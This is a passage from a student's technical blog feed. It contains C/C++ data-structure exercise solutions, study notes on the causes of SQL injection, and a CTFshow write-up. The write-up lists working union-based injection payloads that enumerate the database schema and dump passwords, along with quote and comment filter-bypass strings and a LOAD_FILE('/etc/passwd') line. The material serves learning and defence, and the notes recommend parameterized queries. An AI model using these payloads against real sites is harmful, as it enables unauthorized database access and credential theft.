class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> num1,num2;<br>cin &gt;&gt; num1 ;<br>List L1 = <span class="hljs-built_in">init</span>();<br><span class="hljs-keyword">while</span>(num1--)<br>&#123;<br><span class="hljs-type">int</span> x,y;<br>cin &gt;&gt; x &gt;&gt; y;<br><span class="hljs-built_in">insert</span>(x,y,L1);<br>&#125;<br>cin &gt;&gt; num2;<br>List L2 = <span class="hljs-built_in">init</span>();<br><span class="hljs-keyword">while</span>(num2--)<br>&#123;<br><span class="hljs-type">int</span> x,y;<br>cin &gt;&gt; x &gt;&gt; y;<br><span class="hljs-built_in">insert</span>(x,y,L2);<br>&#125;<br><span class="hljs-comment">//for(int i=0;i&lt;Length(L1);i++)</span><br><span class="hljs-comment">//printf(&quot;%d %d &quot;,L1-&gt;Data[i].x,L1-&gt;Data[i].y);</span><br><span class="hljs-comment">//printf(&quot;\n&quot;);</span><br><span class="hljs-comment">//for(int i=0;i&lt;Length(L2);i++)</span><br><span class="hljs-comment">//printf(&quot;%d %d &quot;,L2-&gt;Data[i].x,L2-&gt;Data[i].y);</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">getsum</span>(L1,L2);<br><span class="hljs-comment">//getmul();</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>这段中尝试使用了动态数组实现顺序表的办法，完成了多项式加法</strong></p><blockquote><ul><li><strong>优势：相比上一份静态数组，处理数据时拿多少用多少。比如同样一组输入，空间占用从165kB降至不到100B。</strong></li><li><strong>缺点：虽然实现，但是代码中有几个问题：</strong></li><li><strong>1.在线算法，算一条输出一条，不灵活，这也解释了为什么乘法部分没有继续写。更好的做法是再开一个数组存答案。</strong></li><li><strong>2.输出部分未封装，题目部分有格式要求，较复杂的输出适合单独封装一个函数做输出。</strong></li><li><strong>3.空间连续，这是开数组和开链表的重要区别：数组空间必须物理上连续，而实际上计算机内存物理上并不连续，你以为的连续实际上是操作系统给出的抽象层，造成了空间连续的假象（逻辑上连续），这就会在要求比较苛刻的情况中浪费空间。</strong></li></ul></blockquote><p><strong>Tips：看懂一份代码不难，重要的是如何独立写出来。一个好办法是阅读注释，注释和编写过程中的调试遗迹是好东西，编写边调试即可化难为简。</strong><br><strong>可惜的是，大多数题解将调试遗迹删去。</strong></p><p><strong>最优解法：链表</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *List;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>&#123;<br>List Next;<br><span class="hljs-type">int</span> z;   <span class="hljs-comment">// 指数 </span><br><span class="hljs-type">int</span> x;  <span class="hljs-comment">// 系数 </span><br>&#125;;<br><br><span class="hljs-comment">// 读入链表 </span><br><span class="hljs-function">List <span class="hljs-title">Read</span><span class="hljs-params">()</span></span>&#123;<br>List L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>List head = L;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br><span class="hljs-type">int</span> x;<br><span class="hljs-type">int</span> z;<br>List t = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,&amp;x,&amp;z);<br>t-&gt;x = x;<br>t-&gt;z = z;<br>L-&gt;Next = t;<br>L = L-&gt;Next;<br>&#125;<br>L-&gt;Next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> head-&gt;Next;<br>&#125;<br><br><span class="hljs-comment">// 实现加法运算 </span><br><span class="hljs-function">List <span class="hljs-title">addition</span><span class="hljs-params">(List L1,List L2)</span></span>&#123;<br>List tmpL1 = L1;<br>List tmpL2 = L2;<br>List add=(List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>add-&gt;Next = <span class="hljs-literal">NULL</span>;<br>List head = add;<br>List t;<br><span class="hljs-keyword">while</span>(tmpL1 &amp;&amp; tmpL2)&#123;<br>t = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br><span class="hljs-keyword">if</span>(tmpL1-&gt;z == tmpL2-&gt;z)&#123;  <span class="hljs-comment">//指数相等，系数相加  </span><br>t-&gt;x = tmpL1-&gt;x + tmpL2-&gt;x;<br>t-&gt;z = tmpL1-&gt;z;<br>tmpL1 = tmpL1-&gt;Next;<br>tmpL2 = tmpL2-&gt;Next;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(tmpL1-&gt;z &lt; tmpL2-&gt;z)&#123;   <span class="hljs-comment">// L2 结点指数更大，把 L2 结点加入链表 </span><br>t-&gt;x = tmpL2-&gt;x;<br>t-&gt;z = tmpL2-&gt;z;<br>tmpL2 = tmpL2-&gt;Next;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(tmpL2-&gt;z &lt; tmpL1-&gt;z)&#123;   <span class="hljs-comment">// L1 结点指数更大，把 L1 结点加入链表 </span><br>t-&gt;x = tmpL1-&gt;x;<br>t-&gt;z = tmpL1-&gt;z;<br>tmpL1 = tmpL1-&gt;Next;<br>&#125;<br>add-&gt;Next = t;<br>add = add-&gt;Next; <br>&#125;<br><span class="hljs-keyword">if</span>(tmpL1)   <span class="hljs-comment">// 若 L1 不等于 NULL，将剩下结点加入其后 </span><br>add-&gt;Next = tmpL1;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(tmpL2)  <span class="hljs-comment">// 同理 </span><br>add-&gt;Next = tmpL2;<br><span class="hljs-keyword">return</span> head-&gt;Next; <span class="hljs-comment">// head 结点只有指针域存值 </span><br>&#125;<br><br><span class="hljs-comment">// 实现乘法运算 </span><br><span class="hljs-function">List <span class="hljs-title">multiplication</span><span class="hljs-params">(List L1,List L2)</span></span>&#123;<br>List tmpL1 = L1;<br>List tmpL2 = L2;<br>List mul=(List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>mul-&gt;Next = <span class="hljs-literal">NULL</span>;<br>List head = mul;<br>List t;<br><span class="hljs-keyword">for</span>(;tmpL1;tmpL1=tmpL1-&gt;Next)<br><span class="hljs-keyword">for</span>(tmpL2 = L2;tmpL2;tmpL2=tmpL2-&gt;Next)&#123;<br>t = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>t-&gt;x = tmpL1-&gt;x * tmpL2-&gt;x;  <span class="hljs-comment">// 系数相乘</span><br>t-&gt;z = tmpL1-&gt;z + tmpL2-&gt;z;  <span class="hljs-comment">// 指数相加</span><br>t-&gt;Next = <span class="hljs-literal">NULL</span>;<br>head = <span class="hljs-built_in">addition</span>(t,mul);  <span class="hljs-comment">// 将新增结点和之前已经排好序的结点排序 </span><br>mul = head; <span class="hljs-comment">// 重新确定开头 </span><br>&#125;<br><span class="hljs-keyword">return</span> head;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(List L)</span></span>&#123;<br>List t = L;<br><span class="hljs-type">int</span> flag = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(;t;t = t-&gt;Next)&#123;<br><span class="hljs-keyword">if</span>(!flag &amp;&amp; t-&gt;x)   <span class="hljs-comment">//控制空格输出</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br><span class="hljs-keyword">if</span>(t-&gt;x)&#123;   <span class="hljs-comment">// 如果系数为 0，不输出 </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,t-&gt;x,t-&gt;z);<br>flag =<span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(flag)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0 0&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>List L1,L2,add,mul;<br>L1 = <span class="hljs-built_in">Read</span>();<br>L2 = <span class="hljs-built_in">Read</span>();<br>add = <span class="hljs-built_in">addition</span>(L1,L2);<br>mul = <span class="hljs-built_in">multiplication</span>(L1,L2);<br><span class="hljs-built_in">Print</span>(mul);<br><span class="hljs-built_in">Print</span>(add);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure>        </div>      </div>    </div><p>0908<br><strong>NO3,<a href="https://pintia.cn/problem-sets/15/exam/problems/type/7?problemSetProblemId=711&page=0">树的同构</a></strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-32145da0" role="button" aria-expanded="false" aria-controls="collapse-32145da0">        <div class="fold-arrow">▶</div>同构。      </div>      <div class="fold-collapse collapse" id="collapse-32145da0">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> null -1</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span>&#123;<br><span class="hljs-type">char</span> data;    <span class="hljs-comment">// 存值 </span><br><span class="hljs-type">int</span> left;   <span class="hljs-comment">// 左子树的下标 </span><br><span class="hljs-type">int</span> right;  <span class="hljs-comment">// 右子树的下标 </span><br>&#125;T1[<span class="hljs-number">10</span>],T2[<span class="hljs-number">10</span>];<br><span class="hljs-comment">// 返回根结点 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">create</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode T[])</span></span>&#123;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> root = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> left,right;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">if</span>(!n)<br><span class="hljs-keyword">return</span> null;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>cin&gt;&gt;T[i].data&gt;&gt;left&gt;&gt;right;<br><span class="hljs-keyword">if</span>(left==<span class="hljs-string">&#x27;-&#x27;</span>)<br>T[i].left = null;<br><span class="hljs-keyword">else</span>&#123;<br>T[i].left = left-<span class="hljs-string">&#x27;0&#x27;</span>;<br>root -= T[i].left;<br>&#125;<br><span class="hljs-keyword">if</span>(right==<span class="hljs-string">&#x27;-&#x27;</span>)<br>T[i].right = null;<br><span class="hljs-keyword">else</span>&#123;<br>T[i].right = right-<span class="hljs-string">&#x27;0&#x27;</span>;<br>root -= T[i].right;<br>&#125;<br><span class="hljs-comment">// 0 累加到 n-1 </span><br>root +=i;<br>&#125;<br><span class="hljs-keyword">return</span> root;<br>&#125;<br><span class="hljs-comment">// 判断是否同构</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">judge</span><span class="hljs-params">(<span class="hljs-type">int</span> R1,<span class="hljs-type">int</span> R2)</span></span>&#123;<br><span class="hljs-keyword">if</span>(R1 == null &amp;&amp; R2 == null)   <span class="hljs-comment">// 都为空 </span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">if</span>(R1 == null &amp;&amp; R2 != null || R1 != null &amp;&amp; R2 == null)    <span class="hljs-comment">// 一个为空，一个不为空</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span>(T1[R1].data != T2[R2].data)   <span class="hljs-comment">// 值不同</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span>((T1[R1].left != null &amp;&amp; T2[R2].left != null )&amp;&amp;(T1[T1[R1].left].data == T2[T2[R2].left].data))  <span class="hljs-comment">// 左儿子不为空且值相等</span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">judge</span>(T1[R1].left,T2[R2].left) &amp;&amp; <span class="hljs-built_in">judge</span>(T1[R1].right,T2[R2].right);<br><span class="hljs-keyword">else</span>   <span class="hljs-comment">// 左儿子不为空且值不等  或者 某一个左儿子为空 </span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">judge</span>(T1[R1].right,T2[R2].left) &amp;&amp; <span class="hljs-built_in">judge</span>(T1[R1].left,T2[R2].right);<br>&#125; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> R1,R2;<br>R1 = <span class="hljs-built_in">create</span>(T1);<br>R2 = <span class="hljs-built_in">create</span>(T2);<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">judge</span>(R1,R2))<br>cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>;<br><span class="hljs-keyword">else</span><br>cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p><strong>感觉难度明显上升了~，已经听开小白专场了。。。</strong></p>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入理论</title>
    <link href="/dong.github/2024/09/03/sqlinjection3/"/>
    <url>/dong.github/2024/09/03/sqlinjection3/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>《SQL注入攻击与防御》Chap1</strong></p><span id="more"></span><h1 id="SQL注入综述"><a href="#SQL注入综述" class="headerlink" title="SQL注入综述"></a>SQL注入综述</h1><p><strong>SQL注入是影响企业运营最具破坏性的漏洞之一，它会泄露保存在应用程序数据库中的敏感信息。</strong><br><strong>定义：应用程序在向后台数据传递SQL查询时，如果为攻击者提供了影响改查询的能力，就会引发SQL注入。</strong><br><strong>外延：不只是一种会影响Web应用的漏洞，对于任何不可信源获取输入的代码来说，如果使用该输入来构造动态SQL语句，就很可能会遭到攻击。</strong><br><strong>典型SQL注入-服务器端的数据库，外延-JS服务器端，Android平台</strong></p><p><strong>历史：1998年，在一次报告中首次进入公众视野，自此SQL注入的防范成为了一个重要的安全研究方向。</strong></p><h1 id="前置："><a href="#前置：" class="headerlink" title="前置："></a>前置：</h1><h2 id="Web应用通用简单构建方式："><a href="#Web应用通用简单构建方式：" class="headerlink" title="Web应用通用简单构建方式："></a>Web应用通用简单构建方式：</h2><p><strong>不管是什么语言编写的Web应用，有一点相同；它们的交互性由数据库驱动。</strong></p><blockquote><ul><li><strong>数据库驱动的Web应用通常包括三层：</strong></li><li><strong>表示层—-Web浏览器</strong></li><li><strong>逻辑层—-PHP、.NET、ASP&amp;……</strong></li><li><strong>存储层—- MYSQL、Oracle等数据库管理系统</strong><br><img src="/dong.github/images/0903-1.jpg"><br><strong>三层架构中最基本的一条规则：表示层不与数据层通信</strong><br><strong>这个过程是如何在代码中实现？书上给出了一段代码：</strong><br><img src="/dong.github/images/0903-2.jpg"></li><li><strong>这段PHP代码简明展现了交互过程，即逻辑层代码构造SQL语句与存储层进行数据交接，再把数据变成好看的页面展示在浏览器</strong></li><li><strong>值得指出的是，实际开发中，mysql_query()早已弃用，而这种把SQL语句直接赋值给变量的做法也非常少见（要查的内容被写死），更常见的应用是构造查询类(Class)，使用代码拼接出sql语句，进而实现链式查询（框架的实现原理）</strong></li><li><strong>这里用到了计算机科学中常用的方法，抽象，构建一个抽象层，用同样的办法（类）应对各种不同的实际情况，大大提高了效率</strong></li></ul></blockquote><h1 id="注入成因："><a href="#注入成因：" class="headerlink" title="注入成因："></a>注入成因：</h1><blockquote><ul><li><strong>如果Web应用开发人员无法确保在将从Web表单，cookie及输入参数等收到的值传递给SQL查询之前以及对其进行验证，通常会出现SQL注入漏洞。</strong></li><li><strong>如果攻击者能够控制发送给SQL查询的输入，并且能够操纵该输入并将其解析为代码而非数据，那么攻击者很可能有能力在后台数据库执行代&gt; 码。</strong></li></ul></blockquote><p><strong>上述成因恰好印证了在CTF sql注入的实际应用：时间盲注、布尔盲注、联合查询盲注等等，都是在寻找各种办法操纵输入，让其变得可执行，可观测。</strong></p><h2 id="构造动态字符串"><a href="#构造动态字符串" class="headerlink" title="构造动态字符串"></a>构造动态字符串</h2><p><strong>开发人员在运行过程中需要根据不同的查询标准来决定提取什么字段，或者根据不同条件来选择不同表，动态构造SQL语句非常有用。</strong><br>动态构造举例：<br><img src="/dong.github/images/0903-3.jpg"></p><h3 id="转义字符处理不当"><a href="#转义字符处理不当" class="headerlink" title="转义字符处理不当"></a>转义字符处理不当</h3><p><strong>单引号被提前闭合，最常见的注入题目</strong><br><strong>单引号不是唯一的转义字符，因数据库管理软件不同而不同，因此熟悉数据库各种特性非常重要</strong></p><h3 id="类型处理不当"><a href="#类型处理不当" class="headerlink" title="类型处理不当"></a>类型处理不当</h3><p><strong>Web开发人员的思维模式：单引号字符是字符串的分隔符，还会被当作代码与数据的分隔线，但是，处理数字数据时，不需要使用单引号，否则数据也被当作了字符串。</strong><br>看条语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">SQL</span> <span class="hljs-operator">=</span> &quot;SELECT * FROM table WHERE field = $_GET[&quot;userid&quot;]&quot;<br></code></pre></td></tr></table></figure><p><strong>!!!攻击者的输入直接被解析成了SQL语法，攻击者没必要使用单引号字符来转义查询，这时候过滤就失效了。</strong><br><strong>想到了CTFShow无过滤注入的最后一题，如果用户拥有FILE权限（一种管理员权限，root用户默认有），</strong><br><strong>MySQL的内置命令：select into outfile，直接创建了系统文件并进行写操作，逆天。</strong><br><strong>select LOAD_FILE(‘&#x2F;etc&#x2F;passwd’)</strong></p><h3 id="查询语句组装不当"><a href="#查询语句组装不当" class="headerlink" title="查询语句组装不当"></a>查询语句组装不当</h3><p><strong>开发者想好要查的东西（有应用接口产生的get参数）被替换了。</strong></p><h3 id="错误处理不当"><a href="#错误处理不当" class="headerlink" title="错误处理不当"></a>错误处理不当</h3><p><strong>出错了，并告诉怎么错。为攻击者提供了重要攻击线索</strong></p><h3 id="多个提交处理不当"><a href="#多个提交处理不当" class="headerlink" title="多个提交处理不当"></a>多个提交处理不当</h3><p><strong>大型Web开发的问题，有些开发人员严格对输入进行了验证，有些却不然，很难保证项目中每个人都遵循相同的标准。总会出现漏网之鱼</strong></p><h3 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h3><blockquote><ul><li><strong>理想情况下，应用应该使用不同数据库用户来执行SQL命令，类似操作系统的权限控制，即使攻击者成功将代码注入，为其分配的权限也是最低的，重要的数据都没有查看权限。</strong></li><li><strong>实际情况是多数应用没有实现像操作系统那样很好的权限分离，因此攻击者可以访问到数据库中的所有数据，甚至在数据库间跳转</strong></li><li><strong>实际情况还有就是开发人员在写代码时通常使用某个内置的权限账户来连接数据库，功能强大的内置用户可以执行很多与程序需求无关的操作。</strong></li><li><strong>要实现上述目标，攻击者首先需要了解可以获取哪些附加内容、数据库有哪些、字段有什么，这就需要访问数据库的元数据-数据库内部包含的数据。</strong><br><strong>这也就解释了SQL注入的第一步总是在查INFORMATION_SCHEMA这个虚拟数据库，因为元数据都在这里。</strong></li></ul></blockquote><h1 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h1><p><img src="/dong.github/images/0903.4.jpg"></p><h1 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A:"></a>Q&amp;A:</h1><p><strong>Q:找到一个网站然后对其注入单引号(‘)，会被起诉吗？</strong><br><strong>A:会，这属于未授权的渗透测试行为，简称黑客行为，受法律制裁。</strong></p><p><strong>Q:是否可以认为禁止输入单引号，就可以避免SQL注入？</strong><br><strong>A:否，很多方法可对单引号进行编码绕过，且单引号不是唯一可以用于注入的字符</strong></p><p><strong>Q:如何在开发中避免出现SQL注入漏洞？</strong><br><strong>A:使用多种语言也不可避免，只要参数未经验证。而参数化查询和绑定变量是很好的办法</strong></p><p><strong>PS：本文中提到的参数化查询，绑定变量，链式查询和构造查询类等内容，详细见php开发部分笔记。</strong></p>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入-有过滤注入</title>
    <link href="/dong.github/2024/09/03/sqlinjection2/"/>
    <url>/dong.github/2024/09/03/sqlinjection2/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>SQL无过滤注入CTFshow176-182</strong></p><span id="more"></span><h1 id="过滤位置"><a href="#过滤位置" class="headerlink" title="过滤位置"></a>过滤位置</h1><p><img src="/dong.github/images/0903.png" alt="alt text"><br><strong>这里过滤的不是整条语句的内容，而是由用户传入的参数部分</strong></p><h2 id="回顾-基本查找流程"><a href="#回顾-基本查找流程" class="headerlink" title="回顾-基本查找流程"></a>回顾-基本查找流程</h2><p><strong>Union Select字段个数-&gt;库名-&gt;表名-&gt;列名-&gt;查找</strong><br><strong>字段个数枚举找出或使用order by</strong><br><strong>库名，列名，表名是在information_schema中找</strong><br><strong>目标数据是在目标库中找</strong><br><strong>注意这里的group_concat操作，以及语句的嵌套，无新意，提高一点点查找效率</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union Select 1,(Select group_concat(schema_name) from information_schema.schemata),database() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">Select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">Select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;ctfshow_web&#x27;</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union Select 1,(Select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27; and table_name=&#x27;</span>ctfshow_user<span class="hljs-string">&#x27;),3 %23</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">Select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">Select</span> group_concat(password) <span class="hljs-keyword">from</span> ctfshow_web.ctfshow_user),<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h2 id="题目顺序总结"><a href="#题目顺序总结" class="headerlink" title="题目顺序总结"></a>题目顺序总结</h2><blockquote><ul><li>大写过滤</li><li>空格过滤</li><li>&#x2F;**&#x2F;过滤</li><li>%0a过滤</li><li>%0b过滤</li><li>%09过滤</li><li>%23过滤</li><li>%0c过滤</li><li>%0e过滤</li></ul></blockquote><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p><strong>通解：围绕万能密码：’or 1&#x3D;1+注释符 的各种变体展开</strong><br><strong>‘or(1&#x3D;1)–%0c</strong><br><strong>‘or’1’&#x3D;’1’–%0c</strong><br><strong>两种基本通用。</strong></p><h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><h3 id="关于注释符"><a href="#关于注释符" class="headerlink" title="关于注释符"></a>关于注释符</h3><h4 id="–注释"><a href="#–注释" class="headerlink" title="–注释"></a><strong>–注释</strong></h4><p><strong>定义：在SQL语言中，使用“–”符号开始的行内注释。</strong><br><strong>特点：</strong><br><strong>注释内容从“–”开始到行尾结束。</strong><br><strong>需要在“–”后</strong>紧跟<strong>一个空格或制表符等。</strong></p><h4 id="注释"><a href="#注释" class="headerlink" title="#注释"></a><strong>#注释</strong></h4><p><strong>定义：使用#符号开始的单行注释。</strong><br><strong>特点：</strong><br><strong>后面的所有内容直到行尾都被视为注释。</strong></p><h3 id="关于url编码"><a href="#关于url编码" class="headerlink" 